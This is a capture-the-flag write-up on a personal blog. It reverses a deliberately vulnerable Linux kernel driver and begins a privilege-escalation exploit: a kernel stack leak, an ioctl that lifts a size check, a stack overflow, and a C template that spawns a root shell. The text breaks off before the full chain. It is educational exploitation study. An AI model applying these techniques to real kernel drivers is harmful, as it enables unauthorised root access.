<!DOCTYPE html>
<html>
    <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1">
    <title>Easy_Kernel Writeup from K3RN3LCTF 2021 - x3ero0&#39;s blog</title>

    <style type="text/css">
        img.wp-smiley,
        img.emoji {
            display: inline !important;
            border: none !important;
            box-shadow: none !important;
            height: 1em !important;
            width: 1em !important;
            margin: 0 .07em !important;
            vertical-align: -0.1em !important;
            background: none !important;
            padding: 0 !important;
        }
    </style>
    <link rel='stylesheet' href='/css/style.css' type='text/css' media='all' />
    <link rel='stylesheet' href='/css/custom.css' type='text/css' media='all' />
    <link rel='stylesheet' href='/css/syntax.css' type='text/css' media='all' />
    <link rel='stylesheet' href='/css/general.css' type='text/css' media='all' />
    <link rel='stylesheet' href='/css/toc.css' type='text/css' media='all' />
    <link rel='stylesheet' href='/css/image.css' type='text/css' media='all' />
</head>

    <body class="two-column">
        <a href="#content">Skip to content</a>
<div class="wrapper">
    <header role="banner" class="banner widgets columns-1">
        <a href="/" rel="home">
            <h1 class="site">x3ero0&#39;s blog</h1>
            <p></p>
        </a>
        <nav role="navigation" aria-label="Primary Navigation">

            <ul class="menu">
                <li class="menu-item "><a class="menu__link" href="/about/">ABOUT</a></li>
                <li class="menu-item "><a class="menu__link" href="/crackmes/">CRACKMES</a></li>
                <li class="menu-item "><a class="menu__link" href="/posts/">POSTS</a></li>
            </ul>
            <select onChange="location.href=value;">
                <option value="/about/" class="menu-item menu-item-type-custom menu-item-object-custom" >ABOUT</option>
                <option value="/crackmes/" class="menu-item menu-item-type-custom menu-item-object-custom" >CRACKMES</option>
                <option value="/posts/" class="menu-item menu-item-type-custom menu-item-object-custom" >POSTS</option>
            </select>
        </nav>
    </header>

    <br>
    <div style="width: 100%; max-height: 100px; text-align: center;">
       
</div>

    <div class="breadcrumbs">
        
    </div>
        <div id="content" class="content">

<main role="main">
    <article role="article" class="post type-post format-standard hentry">
        <header class="post-header">
            <h1>Easy_Kernel Writeup from K3RN3LCTF 2021</h1>
            <div class="post-details">
                <a rel="bookmark">
                    <time datetime="2021-11-14T1114:413:206">2021-11-14</time>
                </a>
				
<span style="float: right;">
    <div id="fb-root" style="height: 100%;"></div>
    
    <script async defer crossorigin="anonymous" src="https://connect.facebook.net/en_US/sdk.js#xfbml=1&version=v3.2"></script>
    
    <div class="fb-share-button" data-href="https://x3ero0.github.io/posts/easy_kernel_exploitation/" data-layout="button_count" data-size="small">
        <a target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fx3ero0.github.io%2fposts%2feasy_kernel_exploitation%2f" class="fb-xfbml-parse-ignore">Share</a>
    </div>
    &nbsp;
    <a href="https://twitter.com/share?ref_src=twsrc%5Etfw" class="twitter-share-button" data-text="Easy_Kernel Writeup from K3RN3LCTF 2021" data-url="https://x3ero0.github.io/posts/easy_kernel_exploitation/" data-show-count="false">Tweet</a>
    <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
    &nbsp;
    
</span>

            </div>
        </header>

        <div class="post-content">
            <ul>
<li>Author : <a href="https://seal9055.com/">Seal</a> <a href="https://twitter.com/seal9055">Twitter</a></li>
<li>CTF : <a href="https://ctftime.org/event/1438">K3RN3LCTF</a></li>
<li>Platform : Linux Kernel 5.4.0 (KASLR, SMEP, SMAP, KPTI)</li>
</ul>


<br>

<p>It&rsquo;s been a while, huh?</p>
<p>Today, we will dive into the basics of Linux Kernel Exploitation.
I am not very experienced when it comes to Linux Kernel Exploitaion and
I am still learning. So, I am writing about the challenge I solved this
weekend in <a href="https://ctftime.org/event/1438">K3RN3LCTF 2021</a>.</p>
<h3 id="first-look">First Look</h3>



<div class="center">
  <img
    class="responsive"
    src="/img/easy_kernel/firstlook.png"
    alt="First look of the Challenge"
    decoding="async"
  />
</div>
<p>We have a bunch of files to work with. Let&rsquo;s first understand what each file actually does</p>
<ul>
<li><strong>bzImage</strong> - (short for Big ZImage) it is the compressed Linux Kernel.</li>
<li><strong>fs</strong> - Uncompressed file system root directory for the VM.</li>
<li><strong>initramfs.cpio.gz</strong> - Compressed file system for the VM.</li>
<li><strong>launch.sh</strong> - Bash script to run the VM.</li>
<li><strong>rebuild_fs.sh</strong> - Bash script to get compressed initramfs.cpio.g from the &ldquo;fs&rdquo; folder.</li>
<li><strong>vuln.ko</strong> - Vulnerable Linux Kernel Driver.</li>
</ul>
<p>The first thing we need to do is figure out what&rsquo;s going on in the Vulnerable Driver.</p>
<h3 id="what-is-a-kernel-driver">What is a kernel driver?</h3>



<div class="center">
  <img
    class="responsive"
    src="/img/easy_kernel/meme.png"
    alt="bruh moment"
    decoding="async"
  />
</div>
<p>Before we dive into reverse engineering the kernel driver, first let&rsquo;s understand
what is a Linux Kernel Driver.</p>
<p>A Linux kernel driver is a specific type of program that allows
hardware and software to work together to accomplish a task. Whenever you
try to print a document, a kernel driver handles your request and sends it
to the actual printer. it simply acts like a medium between the Operating System and
the hardware.</p>
<p>In linux each kernel driver has to register a device file, which is used by
the userland programs to interact with the driver. For example, whenever you
redirect some output to &ldquo;/dev/null&rdquo; you are interacting with the kernel driver.</p>
<p>These drivers are called <a href="https://en.wikipedia.org/wiki/Device_file#Character_devices">&quot;<em>character special device</em>&quot;</a>.</p>
<p>Okay, but how do I interact with a kernel driver?</p>
<p>Your userland program can interact with the kernel driver by first getting a handle to it.
Now, with that handle you can do read/write/ioctl syscalls to read and write data from the driver.</p>
<p>Example:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">get_random_bytes</span>(){
    
    <span style="color:#6272a4">/* get handle to /dev/urandom */</span>
    <span style="color:#8be9fd">int</span> fd <span style="color:#ff79c6">=</span> open(<span style="color:#f1fa8c">&#34;/dev/urandom&#34;</span>, O_RDONLY);
    <span style="color:#8be9fd">int</span> random_bytes <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;

    <span style="color:#6272a4">/* read random bytes on stack variable */</span>
    read(fd, <span style="color:#ff79c6">&amp;</span>random_bytes, <span style="color:#ff79c6">sizeof</span>(random_bytes));

    <span style="color:#6272a4">/* return random bytes */</span>
    <span style="color:#ff79c6">return</span> random_bytes;
}
</code></pre></div><p>The above function interacts with the driver for &ldquo;/dev/urandom&rdquo; to get
some random bytes.</p>
<p>So each kernel driver implements a bunch of device functions like -</p>
<ul>
<li>device_open - called whenever a program tries to open the device using SYS_open.</li>
<li>device_read - called whenever a program does a SYS_read on the device&rsquo;s fd.</li>
<li>device_write - called whenever a program does a SYS_write on the device&rsquo;s fd.</li>
<li>device_release - called whenever a program does a SYS_close on the device&rsquo;s fd.</li>
</ul>
<p>If you are not familiar with linux kernels please skim through this cool <a href="https://blog.sourcerer.io/writing-a-simple-linux-kernel-module-d9dc3762c234">article</a>
The gist is that you interact with the driver by doing syscalls.</p>
<p>Now let&rsquo;s try to reverse engineer what the vulnerable driver is doing.</p>
<h2 id="reversing-vulnko">Reversing Vuln.ko</h2>
<p>Okay, Let&rsquo;s open the driver in IDA Pro.
A kernel driver does not have a main function, we have to reverse the individual
device functions.</p>



<div class="center">
  <img
    class="responsive"
    src="/img/easy_kernel/functions.png"
    alt="function list"
    decoding="async"
  />
</div>
<p>Let&rsquo;s start with sopen function.</p>
<h3 id="sopen">sopen</h3>



<div class="center">
  <img
    class="responsive"
    src="/img/easy_kernel/sopen.png"
    alt="open_function"
    decoding="async"
  />
</div>
<p>This function just prints &ldquo;Device opened&rdquo;.</p>
<h3 id="sread">sread</h3>



<div class="center">
  <img
    class="responsive"
    src="/img/easy_kernel/sread.png"
    alt="read_function"
    decoding="async"
  />
</div>
<p>This function writes the string &ldquo;<strong>Welcome to this kernel pwn series</strong>&rdquo; on the kernel stack variable
and then <strong>nbytes</strong> number of bytes are copied to the userland buffer with the <strong>copy_user_generic_unrolled()</strong> function.</p>
<p>What this means is that if we did a <strong>SYS_read</strong> on the device&rsquo;s fd we would get the string &ldquo;<strong>Welcome to this kernel pwn series\x00</strong>&rdquo; in our buffer.</p>
<p>One thing to note here is that the user controls how many bytes to read and the memory that is being copied is the Kernel Stack.
This is a Memory Leak Vulnerability, because user can read arbitrary amount of bytes from the kernel stack, which may contain kernel pointers.</p>
<p>So, we mark <strong>sread</strong> function as vulnerable and move to the next function.</p>
<h3 id="swrite">swrite</h3>



<div class="center">
  <img
    class="responsive"
    src="/img/easy_kernel/swrite.png"
    alt="write_function"
    decoding="async"
  />
</div>
<p>This function copies the data from <strong>userland_buffer</strong> to the stack variable on the kernel stack.
It only copies the first <strong>nbytes</strong> number of bytes only if <strong>nbytes</strong> is smaller than <strong>MaxBuffer</strong>, which is a global variable in the driver.
nbytes is again user controlled and it leads to Kernel Stack Buffer Overflow Vulnerability.</p>
<p>This function has a bound check, which checks if <strong>nbytes</strong> is smaller than <strong>MaxBuffer</strong>
<strong>MaxBuffer</strong> is initialized with 0x40.</p>



<div class="center">
  <img
    class="responsive"
    src="/img/easy_kernel/maxbuffer.png"
    alt="ioctl_function"
    decoding="async"
  />
</div>
<p>The buffer size is 128 bytes and MaxBuffer is only 0x40. so, we cannot send more than 0x40 bytes.
If we could modify MaxBuffer in someway we may be able to corrupt the stack.</p>
<h3 id="sioctl">sioctl</h3>



<div class="center">
  <img
    class="responsive"
    src="/img/easy_kernel/sioctl.png"
    alt="ioctl_function"
    decoding="async"
  />
</div>
<p>This function is a special function and is invoked when user does an SYS_ioctl syscall.
SYS_ioctl syscall allows you to send commands to the kernel driver.</p>
<p>in the sioctl function above you can see there are only 2 commands.</p>
<ul>
<li>#16 - just prints the value you pass to it.</li>
<li>#32 - sets the global variable <strong>MaxBuffer</strong> to the value you pass to it.</li>
</ul>
<p>and if you remember <strong>MaxBuffer</strong> is the cap on the number of bytes we can write on kernel stack of <strong>swrite</strong> function.
by using this ioctl we can modify the value of <strong>MaxBuffer</strong> which enables us to currupt Stack.</p>
<h3 id="writing-your-first-kernel-exploit">Writing your first Kernel Exploit</h3>
<p>I will be using the <a href="https://www.musl-libc.org/how.html">musl-libc</a> instead of glibc because in kernel exploitation challenges
sometimes the author does not let you upload the exploit in a sane way so you have to send
the exploit using the base64encode-&gt;paste to a file-&gt;base64decode method. So, it helps when
the total size of the binary is small.</p>
<p>I was using glibc for this challenge initially but after completing the exploit, i was not able to upload the binary
because the session timed out before i could finish pasting the base64 encoded text.</p>
<p>Before we start writing the exploit, we first need a few helper functions that will come in handy while debugging.</p>
<p>This is the exploit template i used.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdio.h&gt;</span><span style="color:#ff79c6">
</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdlib.h&gt;</span><span style="color:#ff79c6">
</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;unistd.h&gt;</span><span style="color:#ff79c6">
</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdint.h&gt;</span><span style="color:#ff79c6">
</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;string.h&gt;</span><span style="color:#ff79c6">
</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;fcntl.h&gt;</span><span style="color:#ff79c6">
</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;signal.h&gt;</span><span style="color:#ff79c6">
</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;fcntl.h&gt; </span><span style="color:#ff79c6">
</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;sys/mman.h&gt;</span><span style="color:#ff79c6">
</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;sys/syscall.h&gt;</span><span style="color:#ff79c6">
</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;sys/types.h&gt;</span><span style="color:#ff79c6">
</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;sys/stat.h&gt;</span><span style="color:#ff79c6">
</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;sys/ioctl.h&gt;</span><span style="color:#ff79c6">
</span><span style="color:#ff79c6"></span>
<span style="color:#ff79c6">#if HAVE_STROPTS_H
</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stropts.h&gt;</span><span style="color:#ff79c6">
</span><span style="color:#ff79c6">#endif
</span><span style="color:#ff79c6"></span>
<span style="color:#8be9fd">char</span> exploit[<span style="color:#bd93f9">0x1000</span>]; <span style="color:#6272a4">/* exploit buffer */</span>
<span style="color:#8be9fd">uint64_t</span> counter <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; <span style="color:#6272a4">/* counter */</span>
<span style="color:#8be9fd">int</span> fd <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;           <span style="color:#6272a4">/* file descriptor for pwn_device */</span>

<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">long</span> user_cs, user_ss, user_rflags, user_sp;

<span style="color:#8be9fd">void</span> <span style="color:#50fa7b">save_state</span>(){
    __asm__(
        <span style="color:#f1fa8c">&#34;.intel_syntax noprefix;&#34;</span>
        <span style="color:#f1fa8c">&#34;mov user_cs, cs;&#34;</span>
        <span style="color:#f1fa8c">&#34;mov user_ss, ss;&#34;</span>
        <span style="color:#f1fa8c">&#34;mov user_sp, rsp;&#34;</span>
        <span style="color:#f1fa8c">&#34;pushf;&#34;</span>
        <span style="color:#f1fa8c">&#34;pop user_rflags;&#34;</span>
        <span style="color:#f1fa8c">&#34;.att_syntax;&#34;</span>
    );
    puts(<span style="color:#f1fa8c">&#34;[*] Saved state&#34;</span>);
}

<span style="color:#8be9fd">void</span> <span style="color:#50fa7b">get_shell</span>(<span style="color:#8be9fd">void</span>){
    puts(<span style="color:#f1fa8c">&#34;[*] Returned to userland&#34;</span>);
    <span style="color:#ff79c6">if</span> (getuid() <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>){
        printf(<span style="color:#f1fa8c">&#34;[*] UID: %d, got root!</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, getuid());
        system(<span style="color:#f1fa8c">&#34;/bin/sh&#34;</span>);
    } <span style="color:#ff79c6">else</span> {
        printf(<span style="color:#f1fa8c">&#34;[!] UID: %d, didn&#39;t get root</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, getuid());
        exit(<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>);
    }
}

<span style="color:#8be9fd">void</span> <span style="color:#50fa7b">hexdump</span>(<span style="color:#ff79c6">const</span> <span style="color:#8be9fd">void</span><span style="color:#ff79c6">*</span> data, size_t size) {
    <span style="color:#8be9fd">char</span> ascii[<span style="color:#bd93f9">17</span>];
    size_t i, j;
    ascii[<span style="color:#bd93f9">16</span>] <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;\0&#39;</span>;
    <span style="color:#ff79c6">for</span> (i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> size; <span style="color:#ff79c6">++</span>i) {
        printf(<span style="color:#f1fa8c">&#34;%02X &#34;</span>, ((<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">char</span><span style="color:#ff79c6">*</span>)data)[i]);
        <span style="color:#ff79c6">if</span> (((<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">char</span><span style="color:#ff79c6">*</span>)data)[i] <span style="color:#ff79c6">&gt;=</span> <span style="color:#f1fa8c">&#39; &#39;</span> <span style="color:#ff79c6">&amp;&amp;</span> ((<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">char</span><span style="color:#ff79c6">*</span>)data)[i] <span style="color:#ff79c6">&lt;=</span> <span style="color:#f1fa8c">&#39;~&#39;</span>) {
            ascii[i <span style="color:#ff79c6">%</span> <span style="color:#bd93f9">16</span>] <span style="color:#ff79c6">=</span> ((<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">char</span><span style="color:#ff79c6">*</span>)data)[i];
        } <span style="color:#ff79c6">else</span> {
            ascii[i <span style="color:#ff79c6">%</span> <span style="color:#bd93f9">16</span>] <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;.&#39;</span>;
        }
        <span style="color:#ff79c6">if</span> ((i<span style="color:#ff79c6">+</span><span style="color:#bd93f9">1</span>) <span style="color:#ff79c6">%</span> <span style="color:#bd93f9">8</span> <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">||</span> i<span style="color:#ff79c6">+</span><span style="color:#bd93f9">1</span> <span style="color:#ff79c6">==</span> size) {
            printf(<span style="color:#f1fa8c">&#34; &#34;</span>);
            <span style="color:#ff79c6">if</span> ((i<span style="color:#ff79c6">+</span><span style="color:#bd93f9">1</span>) <span style="color:#ff79c6">%</span> <span style="color:#bd93f9">16</span> <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>) {
                printf(<span style="color:#f1fa8c">&#34;|  %s </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, ascii);
            } <span style="color:#ff79c6">else</span> <span style="color:#ff79c6">if</span> (i<span style="color:#ff79c6">+</span><span style="color:#bd93f9">1</span> <span style="color:#ff79c6">==</span> size) {
                ascii[(i<span style="color:#ff79c6">+</span><span style="color:#bd93f9">1</span>) <span style="color:#ff79c6">%</span> <span style="color:#bd93f9">16</span>] <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;\0&#39;</span>;
                <span style="color:#ff79c6">if</span> ((i<span style="color:#ff79c6">+</span><span style="color:#bd93f9">1</span>) <span style="color:#ff79c6">%</span> <span style="color:#bd93f9">16</span> <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">8</span>) {
                    printf(<span style="color:#f1fa8c">&#34; &#34;</span>);
                }
                <span style="color:#ff79c6">for</span> (j <span style="color:#ff79c6">=</span> (i<span style="color:#ff79c6">+</span><span style="color:#bd93f9">1</span>) <span style="color:#ff79c6">%</span> <span style="color:#bd93f9">16</span>; j <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">16</span>; <span style="color:#ff79c6">++</span>j) { printf(<span style="color:#f1fa8c">&#34;   &#34;</span>);
                }
                printf(<span style="color:#f1fa8c">&#34;|  %s </span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, ascii);
            }
        }
    }
}


<span style="color:#8be9fd">void</span> <span style="color:#50fa7b">telescope</span>(<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span> buffer, <span style="color:#8be9fd">int</span> size){
    size <span style="color:#ff79c6">=</span> size <span style="color:#ff79c6">-</span> (size <span style="color:#ff79c6">%</span> <span style="color:#bd93f9">8</span>);
    <span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> size; i<span style="color:#ff79c6">+=</span><span style="color:#bd93f9">8</span>){
        printf(<span style="color:#f1fa8c">&#34;[0x%.3x] 0x%.16lx</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, i, <span style="color:#ff79c6">*</span>(<span style="color:#8be9fd">uint64_t</span> <span style="color:#ff79c6">*</span>)<span style="color:#ff79c6">&amp;</span>buffer[i]);
    }
}

<span style="color:#8be9fd">int</span> <span style="color:#50fa7b">s08</span>(<span style="color:#8be9fd">char</span> a, <span style="color:#8be9fd">int</span> len){
    <span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> len; i<span style="color:#ff79c6">++</span>){
        exploit[counter <span style="color:#ff79c6">+</span> i] <span style="color:#ff79c6">=</span> a;
    }
    counter <span style="color:#ff79c6">+=</span> len;
    <span style="color:#ff79c6">return</span> len;
}

<span style="color:#8be9fd">int</span> <span style="color:#50fa7b">s64</span>(<span style="color:#8be9fd">uint64_t</span> val){
    <span style="color:#ff79c6">*</span>(<span style="color:#8be9fd">uint64_t</span> <span style="color:#ff79c6">*</span>)(exploit <span style="color:#ff79c6">+</span> counter) <span style="color:#ff79c6">=</span> val;
    counter <span style="color:#ff79c6">+=</span> <span style="color:#bd93f9">8</span>;
    <span style="color:#ff79c6">return</span> counter;
}

<span style="color:#8be9fd">int</span> <span style="color:#50fa7b">pwn</span>(){
    
    save_state();

    <span style="color:#6272a4">/* your exploit here */</span>


    <span style="color:#6272a4">/*                   */</span>

    <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
}

<span style="color:#8be9fd">int</span> <span style="color:#50fa7b">main</span>(){
    <span style="color:#ff79c6">return</span> pwn();
}

</code></pre></div><p>Okay, first let&rsquo;s create a function which will get the handle to the vulnerable device.
In this challenge the vulnerable driver is in &ldquo;<strong>/proc/pwn_device</strong>&rdquo;.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">get_device</span>(){
    fd <span style="color:#ff79c6">=</span> open(<span style="color:#f1fa8c">&#34;/proc/pwn_device&#34;</span>, O_RDWR);
	<span style="color:#ff79c6">if</span> (fd <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0</span>){
		puts(<span style="color:#f1fa8c">&#34;[!] Failed to open device&#34;</span>);
	} <span style="color:#ff79c6">else</span> {
        puts(<span style="color:#f1fa8c">&#34;[*] Opened device&#34;</span>);
    }
}
</code></pre></div><p>We can call this function inside the <strong>pwn()</strong> to get the file descriptor.
Now let&rsquo;s try to read from the driver and let&rsquo;s see if we receive the &ldquo;<strong>Welcome to this kernel pwn series</strong>&rdquo; string or not.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">pwn</span>(){
    
    save_state(); <span style="color:#6272a4">/* saves useful registers */</span>
    get_device(); <span style="color:#6272a4">/* opens the driver */</span>

    <span style="color:#8be9fd">char</span> buffer[<span style="color:#bd93f9">0x100</span>] <span style="color:#ff79c6">=</span> {<span style="color:#bd93f9">0</span>};
    read(fd, buffer, <span style="color:#bd93f9">0x100</span>); <span style="color:#6272a4">/* read into buffer */</span>
    puts(buffer); <span style="color:#6272a4">/* print everythin we read */</span>

    <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
}
</code></pre></div><p>Just put this pwn function in your exploit.c and then build it.
For building the exploit i use a <strong>Makefile</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Makefile" data-lang="Makefile"><span style="color:#50fa7b">all</span><span style="color:#ff79c6">:</span>
	musl-gcc -O3 -static exploit.c -o fs/exploit
</code></pre></div><p>Now we need to run <strong>make</strong> in terminal to build the exploit
and then use the <strong>rebuild_fs.sh</strong> script to build the initramfs</p>



<div class="center">
  <img
    class="responsive"
    src="/img/easy_kernel/buildcommands.png"
    alt="build commands"
    decoding="async"
  />
</div>
<p>Now we can run the VM to test our exploit using &ldquo;<strong>./launch.sh</strong>&rdquo;
Once in the VM, you can run the exploit by running &ldquo;<strong>/exploit</strong>&rdquo;</p>



<div class="center">
  <img
    class="responsive"
    src="/img/easy_kernel/readoutput.png"
    alt="build commands"
    decoding="async"
  />
</div>
<p>Okay, our read syscall read the string which is perfect.
Let&rsquo;s try crashing the kernel by currupting the stack.</p>
<p>before we can overwrite important stuff on the stack, we need to bypass
the bound check which was comparing the <strong>nbytes</strong> to <strong>MaxBuffer</strong>.</p>
<p>To bypass the check we need to do an ioctl syscall and send the new value of <strong>MaxBuffer</strong> with command #32.
Now, we can send a bunch of &ldquo;A&quot;s to see if a kernel bruh moment happens or not.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">pwn</span>(){
    
    save_state(); <span style="color:#6272a4">/* saves useful registers */</span>
    get_device(); <span style="color:#6272a4">/* opens the driver */</span>

    ioctl(fd, <span style="color:#bd93f9">32</span>, <span style="color:#ff79c6">sizeof</span>(exploit));

    memset(exploit, <span style="color:#f1fa8c">&#39;A&#39;</span>, <span style="color:#ff79c6">sizeof</span>(exploit));
    write(fd, exploit, <span style="color:#ff79c6">sizeof</span>(exploit));
    <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
}
</code></pre></div><p>Running the exploit leads to a kernel panic because we currupted the stack canary.</p>



<div class="center">
  <img
    class="responsive"
    src="/img/easy_kernel/kernelpanic.png"
    alt="kernel bruh moment"
    decoding="async"
  />
</div>
<h3 id="rip-control">RIP Control</h3>
<p>The reason for kernel panic in the above picture is that we currupted the stack cookie and not the actual return address.</p>
<p>How do we leak the cookie?
Remember we have a Memory Leak Vulnerability in <strong>sread</strong>? we can use that bug to leak stack cookie.</p>
<p>I will use <a href="https://github.com/hugsy/gef">gdb-gef</a> gdb plugin because it&rsquo;s faster than my other favorite gdb plugin (pwndbg)
We also need the uncompressed <strong>vmlinux</strong> file from the compressed <strong>bzImage</strong>. To extract <strong>vmlinux</strong> i will use this <a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">script</a>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">$ ./extract-vmlinux.sh ./bzImage &gt; vmlinux
$ file ./vmlinux
vmlinux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), ... stripped
</code></pre></div><p>For debugging i like the setup where i have both gdb and the vm opened side by side.</p>



<div class="center">
  <img
    class="responsive"
    src="/img/easy_kernel/setup.png"
    alt="kernel bruh moment"
    decoding="async"
  />
</div>
<p>Also for debugging i edited the &ldquo;<strong>fs/init</strong>&rdquo; file to give us root access on the VM.
And i also disabled <strong>KASLR</strong> in the <strong>./launch.sh</strong></p>
<p>First thing you may want to do is comment out the 12th line in <strong>fs/init</strong> to get root access on the VM.
For enabeling gdbserver in <strong>qemu-system-x86_64</strong> you must add the &ldquo;<strong>-s</strong>&rdquo; flag in &ldquo;<strong>./launch.sh</strong>&rdquo;.
For disabling <strong>KASLR</strong> you must replace &ldquo;<strong>kaslr</strong>&rdquo; with &ldquo;<strong>nokaslr</strong>&rdquo; in &ldquo;<strong>./launch.sh</strong>&rdquo;</p>
<p>Modified &ldquo;<strong>fs/init</strong>&quot;:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ff79c6">#!/bin/sh
</span><span style="color:#ff79c6"></span>
mount -t proc none /proc
mount -t sysfs none /sys
mount -t 9p -o <span style="color:#8be9fd;font-style:italic">trans</span><span style="color:#ff79c6">=</span>virtio,version<span style="color:#ff79c6">=</span>9p2000.L,nosuid hostshare /home/ctf

insmod /vuln.ko

chown root /flag.txt
chmod <span style="color:#bd93f9">700</span> /flag.txt

<span style="color:#6272a4"># exec su -l ctf # comment me to gain root</span>
/bin/sh
</code></pre></td></tr></table>
</div>
</div><p>Modified &ldquo;<strong>./launch.sh</strong>&quot;:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
